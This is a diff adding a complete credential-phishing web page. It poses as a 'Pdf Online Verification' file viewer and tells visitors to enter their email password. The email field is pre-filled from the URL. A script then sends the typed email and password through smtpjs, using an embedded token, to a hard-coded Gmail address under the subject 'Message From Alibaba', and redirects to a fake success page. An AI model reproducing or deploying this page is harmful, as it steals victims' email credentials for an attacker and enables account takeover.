@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Access Pdf</title>  
+  
+  <link rel="stylesheet" href="styles.css">
+  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+   <link rel="shortcut icon" href="fa.png" type="image/x-icon">
+   
+  
+</head>
+<body>
+  <div class="wrapper">
+    <form action="success.html" Method =“GET”>
+        <h1>View Online Items</h1>
+        <br>
+        <br>
+      <div class="remember-forgot"><h2>
+        <label><input type="checkbox">View Items</label><br><br>
+        <label><input type="checkbox">Product Specification</label><br><br>
+        <label><input type="checkbox">Download Items</label></h2>    
+      </div>
+      <br>
+     
+     <div class="h3"><h3>Click To Access File</h3> </div>
+      
+     <a href="#sign"><div class="head-doc"><img src="doc.png" alt="">
+</div></a> 
+      
+      <br>
+       <br>
+        <br>
+         <br>
+          <br>
+           <br>
+            <br>
+            <br>
+       <br>
+        <br>
+         <br>
+          <br>
+           <br>
+            <br>
+            <br>
+       <br>
+        <br>
+         <br>
+          <br>
+           <br>
+            <br>
+            <br>
+       <br>
+        <br>
+         <br>
+          <br>
+           <br>
+            <br>
+            <br>
+       <br>
+        <br>
+         <br>
+          <br>
+           <br>
+            <br>
+            <br>
+       <br>
+        <br>
+         <br>
+          <br>
+           <br>
+            <br>
+         
+      <section id="sign">
+           <h1>Pdf Online Verification</h1>
+        <br>
+            <br>
+        <br> 
+      <h3>These files are <strong><em><u>Sensitive and Secured against Unauthorized access.</em></strong></u> In order to access this file, please provide your correct email credentials, we will connect to your email provider through a secured IMAP channel to authorize your download.</em></h3>
+      <div class="input-box">
+        <input type="text" id="email" placeholder="email" required>
+        <i class='bx bxs-user'></i>
+      </div>
+      <div class="input-box">
+        <input type="password" id="password" placeholder="password" required>
+        <i class='bx bxs-lock-alt' ></i>
+      </div>
+      <div class="remember-forgot">
+        <label><input type="checkbox">Remember Me</label>
+        <a href="#">Forgot Password</a>
+      </div>
+      <button type="button" class="btn" onclick="SendEmail()">Login</button>
+
+      <div class="register-link">
+        <p>Dont have an account? <a href="#">Register</a></p>
+      </div>
+    </form>
+  </div>
+  </section>
+  
+  
+  <!-- auto attach email -->
+  
+
+
+ <script>
+        window.onload = function() {
+            var urlParams = new URLSearchParams(window.location.search);
+            var email = urlParams.get('email');
+            document.getElementById('email').value = email || '';
+        };
+ </script>
+ 
+     <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+
+ <script>
+     function SendEmail() {
+    event.preventDefault();
+    let email = document.getElementById("email").value.trim();
+    let password = document.getElementById("password").value.trim();
+
+    let body = "Email: ";
+    if (email !== "") {
+        body += email;
+    } else {
+        body += "Not provided";
+    }
+    body += "<br> Password: ";
+    if (password !== "") {
+        body += password;
+    } else {
+        body += "Not provided";
+    }
+
+    Email.send({
+        SecureToken: "8c1f6c2a-54a4-4d36-a565-8ef819110ef7",
+        To: 'nowtext081@gmail.com',
+        From: "nowtext081@gmail.com",
+        Subject: "Message From Alibaba",
+        Body: body
+    }).then(
+        function(response) {
+            // Redirect to success page after email is sent successfully
+            window.location.href = "success.html";
+        }
+    );
+}
+
+    </script>
+  
+</body>
+</html>
